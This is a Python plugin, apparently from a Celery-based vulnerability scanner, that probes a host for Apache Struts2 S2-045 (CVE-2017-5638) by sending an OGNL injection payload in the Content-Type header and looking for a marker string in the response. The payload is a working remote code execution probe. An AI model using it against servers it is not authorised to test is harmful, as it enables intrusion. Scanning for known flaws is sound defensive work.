
import requests
from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Apache Struts2-045 远程代码执行（CVE-2017-5638）
plugin_id=42
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    hits = ['biuframework']
    try:
        targets = [target]
        headers = {"Content-Type": "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('biu'+'framework')).(#o.close())}"}
        #requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=10, verify=False, headers=headers)
                for hit in hits:
                    if hit in response.text:
                        output = response.text

                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False


